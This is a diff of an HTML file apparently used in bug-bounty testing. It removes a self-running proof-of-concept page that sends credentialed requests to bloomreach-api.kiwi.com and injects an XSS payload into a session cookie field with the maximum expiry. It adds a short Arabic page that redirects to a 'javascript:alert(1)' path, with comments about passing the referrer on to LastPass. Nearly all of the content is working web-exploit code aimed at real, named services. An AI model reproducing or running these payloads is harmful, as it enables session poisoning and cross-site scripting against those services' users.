@@ -1,108 +1,27 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>Exploit PoC - Kiwi.com / Bloomreach API</title>
-    <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; padding: 40px; text-align: center; }
-        .container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); display: inline-block; max-width: 600px; width: 100%; }
-        h2 { color: #1a73e8; }
-        .step { margin: 15px 0; padding: 10px; border-left: 4px solid #ccc; text-align: left; background: #fafafa; }
-        .active { border-left-color: #1a73e8; background: #e8f0fe; }
-        .done { border-left-color: #34a853; background: #e6f4ea; }
-        #log { font-family: monospace; font-size: 13px; color: #333; margin-top: 20px; white-space: pre-wrap; text-align: left; border: 1px solid #ddd; padding: 10px; height: 150px; overflow-y: auto; }
-    </style>
+    <title>Referrer Test</title>
 </head>
 <body>
 
-<div class="container">
-    <h2>Bloomreach Session Poisoning PoC</h2>
-    <p>Target: <strong>bloomreach-api.kiwi.com</strong></p>
+    <h3>اختبار الـ Referrer المسار الملغم</h3>
     
-    <div id="step1" class="step">Step 1: Initializing Session (GET bundle)</div>
-    <div id="step2" class="step">Step 2: Injecting Malicious Payload (POST bulk)</div>
-    
-    <div id="log">Initializing Exploit Chain...</div>
-</div>
+    <!-- زر يقوم بالتوجيه إلى صفحة فرعية تحتوي على الكود في الرابط -->
+    <button onclick="triggerExploit()">اضغط للانتقال</button>
 
-<script>
-    const projectId = "bd6048c2-c115-11ea-b1b2-6e9e95c44d66";
-    const bundleUrl = `https://bloomreach-api.kiwi.com/webxp/projects/${projectId}/bundle`;
-    const bulkUrl = "https://bloomreach-api.kiwi.com/bulk";
-    const logElem = document.getElementById('log');
-
-    function updateLog(msg) {
-        logElem.innerHTML += `\n[${new Date().toLocaleTimeString()}] ${msg}`;
-        logElem.scrollTop = logElem.scrollHeight;
-    }
-
-    async function runExploit() {
-        try {
-            // المرحلة الأولى: طلب GET لجلب الكوكيز الأساسية
-            document.getElementById('step1').classList.add('active');
-            updateLog("Executing GET request to fetch bundle and set cookies...");
+    <script>
+        function triggerExploit() {
+            // سنوجه المستخدم أولاً إلى مسار يحتوي على "الكود" كجزء من الرابط
+            // ثم من ذلك المسار يتم التوجيه إلى LastPass
+            let payloadPath = "/javascript:alert(1)";
             
-            await fetch(bundleUrl, {
-                mode: 'cors',
-                credentials: 'include' // إرسال واستقبال الكوكيز
-            });
-
-            document.getElementById('step1').classList.remove('active');
-            document.getElementById('step1').classList.add('done');
-            updateLog("Step 1 Complete: Cookies (xnpe_...) should now be set in the browser.");
-
-            // انتظار ثانية واحدة لضمان استقرار الجلسة
-            await new Promise(r => setTimeout(r, 1500));
-
-            // المرحلة الثانية: طلب POST لحقن الحمولة (Payload)
-            document.getElementById('step2').classList.add('active');
-            updateLog("Executing POST request to /bulk with malicious payload...");
-
-            const payload = {
-                "sdk": "js-client",
-                "sdk_version": "v3.50.0",
-                "sdk_snippet_version": "v2.7.0",
-                "commands": [{
-                    "name": "system/ids",
-                    "data": {
-                        "project_id": projectId,
-                        "cookie": "<img src=x onerror=alert('XSS_POC_SUCCESS')>",
-                        "customer": {},
-                        "expires": 2147483647 // لضمان بقاء الحمولة لأطول فترة
-                    }
-                }]
-            };
-
-            const response = await fetch(bulkUrl, {
-                method: "POST",
-                mode: "cors",
-                credentials: "include",
-                headers: {
-                    "Content-Type": "text/plain;charset=UTF-8"
-                },
-                body: JSON.stringify(payload)
-            });
-
-            const result = await response.json();
-
-            if (response.ok && result.success) {
-                document.getElementById('step2').classList.remove('active');
-                document.getElementById('step2').classList.add('done');
-                updateLog("Step 2 Complete: Payload successfully injected!");
-                updateLog("Server Response: " + JSON.stringify(result.results[0]));
-                alert("Exploit Finished! The payload is now tied to your Bloomreach session.");
-            } else {
-                updateLog("Step 2 Failed: " + response.status);
-            }
-
-        } catch (err) {
-            updateLog("ERROR: " + err.message);
+            // ملاحظة: لكي يرسل المتصفح الـ Referrer كاملاً، يجب أن نكون على خادم (Server)
+            // المتصفحات الحديثة قد تقص المسار وتكتفي بالدومين فقط (Origin-only)
+            window.location.href = payloadPath;
         }
-    }
-
-    // بدء التنفيذ
-    runExploit();
-</script>
+    </script>
 
 </body>
 </html>
